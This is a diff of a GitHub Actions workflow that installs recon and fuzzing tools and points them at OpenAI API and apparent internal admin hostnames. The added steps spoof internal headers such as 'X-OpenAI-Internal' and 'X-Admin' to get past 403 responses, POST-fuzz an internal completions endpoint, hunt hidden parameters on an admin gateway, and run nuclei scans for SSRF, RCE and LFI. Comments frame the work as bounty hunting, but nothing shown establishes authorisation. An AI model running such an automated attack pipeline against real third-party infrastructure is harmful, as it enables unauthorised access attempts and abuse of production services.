@@ -15,46 +15,51 @@ jobs:
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest
           go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install -v github.com/ffuf/ffuf/v2@latest
           pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
 
-      - name: Phase 1:High-Value Target Injection
+      - name: Phase 1:API Gateway Bypass Testing
         run: |
-          # We focus on the 'Unified' and 'Internal' endpoints you discovered
-          cat <<EOF > targets.txt
-          admin.unified-8.api.openai.com
-          chat-onramp.unified-5.api.openai.com
-          higherlevelapi.unified-8.api.openai.com
-          unified-79.api.openai.com
-          api.openai.com/v1/completionsinternal
-          EOF
-          httpx -l targets.txt -silent -sc -title -o live_targets.txt
-
-      - name: Phase 2:Active Path Fuzzing & Bypass Testing
-        run: |
-          # We use Katana to find hidden paths on those 404/403 endpoints
-          # We inject 'internal' headers to see if the 404 turns into a 200
-          katana -list live_targets.txt -jc -kf all -d 3 -rl 10 \
-          -H "X-OpenAI-Internal: true" \
-          -H "X-Forwarded-For: 127.0.0.1" \
-          -o all_endpoints.txt
-
-      - name: Phase 3:Targeted CVE & Logic Scan
-        run: |
-          # 1. Nuclei: Testing for SSRF, RCE, and Auth Bypass CVEs
-          # We use specific tags for API vulnerabilities (CVE-2024-XXXX patterns)
-          nuclei -l all_endpoints.txt -tags cve,ssrf,rce,auth-bypass,lfi -severity critical,high -rl 5 -o nuclei_results.txt || true
+          # Targeting the specific unified gateways and internal paths
+          echo "https://api.openai.com/v1/completionsinternal" > targets.txt
+          echo "https://admin.unified-8.api.openai.com" >> targets.txt
+          echo "https://higherlevelapi.unified-8.api.openai.com" >> targets.txt
           
-          # 2. Arjun: Fuzzing the 'completionsinternal' for hidden required parameters
-          # Often a 404 is returned if a 'required' parameter is missing
-          arjun -u "https://api.openai.com/v1/completionsinternal" --rate-limit 2 -oJ "internal_params.json" || true
+          # HTTPX testing for 403 bypass using internal headers
+          httpx -l targets.txt -H "X-Forwarded-For: 127.0.0.1" -H "X-OpenAI-Internal: true" -H "X-Admin: true" -sc -title -o bypass_results.txt
+
+      - name: Phase 2:POST Verb & JSON Fuzzing (The "404" Killer)
+        run: |
+          # Fuzzing for the correct model name or internal parameter that triggers the API
+          # We use a POST request because internal completion APIs rarely support GET
+          ffuf -u "https://api.openai.com/v1/completionsinternal" -X POST \
+          -H "Content-Type: application/json" \
+          -d '{"model": "FUZZ", "prompt": "hi"}' \
+          -w /usr/share/dict/words -mc 200,401,403,500 -o api_fuzz_results.json || true
+
+      - name: Phase 3:Forced Parameter Discovery (BOLA/IDOR Hunt)
+        run: |
+          # Arjun is forced to use POST mode to find hidden organization/user parameters
+          arjun -u "https://api.openai.com/v1/completionsinternal" -m POST --rate-limit 2 -oJ "params_discovery.json" || true
+          
+          # Checking admin gateways for hidden 'debug' or 'internal' flags
+          arjun -u "https://admin.unified-8.api.openai.com" -m GET --rate-limit 2 -oJ "admin_params.json" || true
+
+      - name: Phase 4:SSRF & RCE Nuclei Scan
+        run: |
+          # Specific templates for Out-of-Band (OOB) and Server Side Request Forgery
+          # If completionsinternal can reach an external server, it is a massive bounty
+          nuclei -l targets.txt -tags ssrf,oast,blind-idor,rce,lfi -severity critical,high -rl 5 -o nuclei_results.txt || true
 
       - name: Archive Critical Evidence
         uses: actions/upload-artifact@v4
         with:
-          name: openai-high-cve-results
+          name: openai-api-gold-results
           path: |
             nuclei_results.txt
-            all_endpoints.txt
-            internal_params.json
+            api_fuzz_results.json
+            params_discovery.json
+            admin_params.json
+            bypass_results.txt
             
